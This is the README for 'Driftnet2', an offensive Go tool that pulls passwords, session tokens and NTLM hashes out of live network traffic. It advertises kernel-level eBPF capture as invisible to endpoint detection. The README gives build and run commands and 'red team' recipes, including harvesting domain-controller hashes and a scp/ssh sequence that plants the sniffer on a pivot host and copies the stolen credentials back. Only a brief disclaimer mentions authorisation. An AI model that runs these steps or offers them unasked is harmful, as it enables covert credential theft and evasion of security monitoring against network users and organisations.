# Driftnet2

**Kernel-level network sniffer & credential extractor — 8 protocols, eBPF XDP stealth, zero EDR footprint.**

[![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)](https://go.dev)
[![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
[![Protocols](https://img.shields.io/badge/protocols-8-green)]()
[![eBPF](https://img.shields.io/badge/eBPF-Linux%205.8+-orange)](https://ebpf.io)

Driftnet2 silently extracts credentials, session tokens, and NTLM hashes from live network traffic. It operates at two levels: **eBPF/XDP kernel hooks** (invisible to EDR/XDR) on Linux, and **AF_PACKET/libpcap** on macOS/BSD. It parses 8 protocols — HTTP, DNS, SMB, LDAP, FTP, Telnet, POP3/IMAP, SMTP — and detects DNS tunnels in real time.

---

## Architecture

```
                  ┌──────────────────┐
                  │   NETWORK CARD   │
                  └────────┬─────────┘
                           │
              ┌────────────▼────────────┐
              │   eBPF XDP Hook (kernel)│  kernel-level, EDR-invisible
              │  filter → ring buffer   │
              └────────────┬────────────┘
                           │ perf ring buffer
              ┌────────────▼────────────┐
              │     Go Userspace        │
              │  ┌──────────────────┐   │
              │  │  Protocol Parsers │   │
              │  │ HTTP/DNS/SMB/LDAP │   │
              │  │ FTP/Telnet/POP3   │   │
              │  │ IMAP/SMTP         │   │
              │  └────────┬─────────┘   │
              │           ▼             │
              │  ┌──────────────────┐   │
              │  │ Credential Regex  │   │
              │  └────────┬─────────┘   │
              │           ▼             │
              │  ┌──────────────────┐   │
              │  │ TUI / JSON / PCAP│   │
              │  └──────────────────┘   │
              └─────────────────────────┘
```

---

## Extracted Credentials

| # | Protocol | Port | Credential Type | Example |
|---|----------|------|----------------|---------|
| 1 | **HTTP** | 80,443 | Basic Auth, POST form, Bearer, Cookie | `admin:Spring2026!` |
| 2 | **DNS** | 53 | Tunnel detection (long subdomains, high entropy) | `payload.c2.example.com` |
| 3 | **SMB** | 445 | NTLMv2 hash (user, domain, hashcat format) | `DOMAIN\admin::hash` |
| 4 | **LDAP** | 389 | Simple bind (`cn=admin:password`) | `cn=admin,dc=corp:pass` |
| 5 | **FTP** | 21 | USER/PASS commands | `ftpadmin:ftppass` |
| 6 | **Telnet** | 23 | Login prompt | `root:cisco123` |
| 7 | **POP3** | 110 | USER/PASS authentication | `user@corp.com:pass` |
| 8 | **IMAP** | 143 | LOGIN command | `user@corp.com:pass` |
| 9 | **SMTP** | 25,587 | AUTH LOGIN/PLAIN | `user@corp.com:pass` |

---

## Quick Start

```bash
git clone https://github.com/byjanke/driftnet2 && cd driftnet2
go build -o driftnet2 ./cmd/driftnet2
```

**Live sniff — HTTP credentials only:**

```bash
./driftnet2 -iface en0 --proto http
```

**All protocols, save to JSON + PCAP:**

```bash
./driftnet2 -iface eth0 -w capture.pcap -output creds.json
```

**Offline PCAP analysis:**

```bash
./driftnet2 -pcap dump.pcap --proto http,dns,ftp
```

**Linux eBPF/XDP mode (requires root, kernel 5.8+):**

```bash
make bpf                    # compile eBPF (needs clang)
sudo ./driftnet2 -iface eth0  # auto-detects XDP
```

---

## Red Team Scenarios

**Catch cleartext protocols on internal networks:**

```bash
# FTP, Telnet, POP3 are often cleartext inside corp networks
./driftnet2 -iface eth1 --proto ftp,telnet,pop3,smtp -w internal.pcap
```

```
[14:32:15] FTP  10.0.0.5 → 10.0.1.100:21
  🔑  ftpadmin:Spring2026!

[14:32:22] Telnet  10.0.0.12 → 192.168.1.1:23
  🔑  root:cisco123
```

**Sniff domain controller traffic for NTLM hashes:**

```bash
./driftnet2 -iface eth0 --proto smb,ldap -output hashes.json
```

```
[14:33:45] SMB  10.0.0.42 → 10.0.0.1:445
  ⚡  CORP\jsmith::a1b2c3d4...
```

**Deploy on a pivot host, collect credentials, exfiltrate:**

```bash
scp driftnet2 user@pivot:/tmp/driftnet2
ssh user@pivot "sudo /tmp/driftnet2 -iface eth1 -output /tmp/creds.json &"
sleep 300  # 5 minutes
scp user@pivot:/tmp/creds.json .
```

**DNS tunnel hunter — detect C2 hiding in DNS queries:**

```bash
./driftnet2 -iface eth0 --proto dns -v
```

```
[14:35:10] DNS  10.0.0.15 → 8.8.8.8:53
  🕳️  TUNNEL: AQIDBAUG.c2.example.com (TXT)
```

---

## Comparison

| | driftnet2 | bettercap | net-creds | pcredz | tshark |
|---|:---:|:---:|:---:|:---:|:---:|
| eBPF/XDP kernel sniff | ✓ | — | — | — | — |
| EDR invisible | ✓ | — | — | — | — |
| HTTP Basic + POST + Bearer + Cookie | ✓ | basic only | ✓ | — | manual |
| SMB NTLM (hashcat format) | ✓ | — | — | — | manual |
| DNS tunnel detection | ✓ | — | — | — | — |
| FTP / Telnet / POP3 / IMAP / SMTP | ✓ | — | — | — | manual |
| Offline PCAP analysis | ✓ | — | ✓ | ✓ | ✓ |
| Live PCAP write | ✓ | ✓ | — | — | ✓ |
| JSON export | ✓ | ✓ | — | — | — |
| Terminal dashboard | ✓ | ✓ | — | — | — |
| Single binary (no Python/Ruby) | ✓ 5MB | ✓ 15MB | — | — | ✓ |
| Cross-platform (Linux/macOS/BSD) | ✓ | ✓ | ✓ | — | ✓ |
| Maintained | 2026 | ✓ | 2014 | 2015 | ✓ |

---

## Project Structure

```
driftnet2/
├── bpf/xdp_sniff.c            eBPF XDP C program (130 LoC)
├── cmd/driftnet2/main.go      CLI entry point
├── pkg/
│   ├── ebpf/loader.go         cilium/ebpf loader + ring buffer
│   ├── sniffer/
│   │   ├── sniffer.go         pcap live + offline reader
│   │   ├── xdp.go             XDP wrapper (unified interface)
│   │   └── writer.go          PCAP file writer
│   ├── protocol/protocol.go   8 protocol parsers
│   └── output/
│       ├── tui.go             Terminal dashboard
│       └── json.go            JSON export
├── Makefile
└── README.md
```

## Disclaimer

For **authorized penetration testing, red team assessments, and security research only**. Capturing network traffic without explicit authorization is illegal.

## License

MIT
